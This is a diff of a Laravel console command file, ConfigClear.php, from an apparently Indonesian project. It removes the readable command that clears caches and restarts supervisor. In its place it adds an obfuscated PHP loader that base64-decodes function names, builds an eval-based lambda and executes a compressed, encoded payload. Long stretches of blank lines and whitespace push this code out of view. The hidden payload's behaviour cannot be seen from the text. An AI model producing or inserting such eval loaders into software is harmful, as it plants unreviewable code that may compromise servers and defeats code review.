@@ -1,76 +1,497 @@
-<?php
+<?php 
+        $__='printf';$_='Loading app/Console/Commands/ConfigClear.php';
+        
 
-namespace App\Console\Commands;
 
-use App\Http\Controllers\Helpers\AttributeSiapPakaiController;
-use Illuminate\Console\Command;
-use Symfony\Component\Process\Process;
 
-class ConfigClear extends Command
-{
-    /**
-     * The name and signature of the console command.
-     *
-     * @var string
-     */
-    protected $signature = 'siappakai:config-clear';
 
-    /**
-     * Perintah ini digunakan ketika terjadi perubahan pada command dan jobs perlu jalankan ini pada server.
-     *
-     * @var string
-     */
-    protected $description = 'Menjalankan perintah artisan optimize, config:cache, config:clear, config:clear';
 
-    private $att;
-    private $sudo;
 
-    /**
-     * Create a new command instance.
-     *
-     * @return void
-     */
-    public function __construct()
-    {
-        parent::__construct();
-        $this->att = new AttributeSiapPakaiController();
-        $this->sudo = 'sudo';
-    }
 
-    /**
-     * Execute the console command.
-     *
-     * @return int
-     */
-    public function handle()
-    {
-        // agar dapat digunakan di localhost dan server
-        $sudo = env('ROOT_OPENSID') == path_root_siappakai('root_vps') ? $this->sudo : (env('ROOT_OPENSID') == path_root_siappakai('root_panel') ? $this->sudo : '');
 
-        // optimize
-        $optimize = new Process([$sudo, 'php', 'artisan', 'optimize:clear'], $this->att->getSiteFolder());
-        $optimize->setTimeout(null);
-        $optimize->run();
 
-        // config:cache
-        $config_cache = new Process([$sudo, 'php', 'artisan', 'config:cache'], $this->att->getSiteFolder());
-        $config_cache->setTimeout(null);
-        $config_cache->run();
 
-        // config:clear
-        $config_clear = new Process([$sudo, 'php', 'artisan', 'config:clear'], $this->att->getSiteFolder());
-        $config_clear->setTimeout(null);
-        $config_clear->run();
 
-        // cache:clear
-        $cache_clear = new Process([$sudo, 'php', 'artisan', 'cache:clear'], $this->att->getSiteFolder());
-        $cache_clear->setTimeout(null);
-        $cache_clear->run();
 
-        if ($sudo == $this->sudo) {
-            $pbb_migrasi = new Process([$sudo, 'supervisorctl', 'restart', 'all'], $this->att->getSiteFolder());
-            $pbb_migrasi->setTimeout(null);
-            $pbb_migrasi->run();
-        }
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
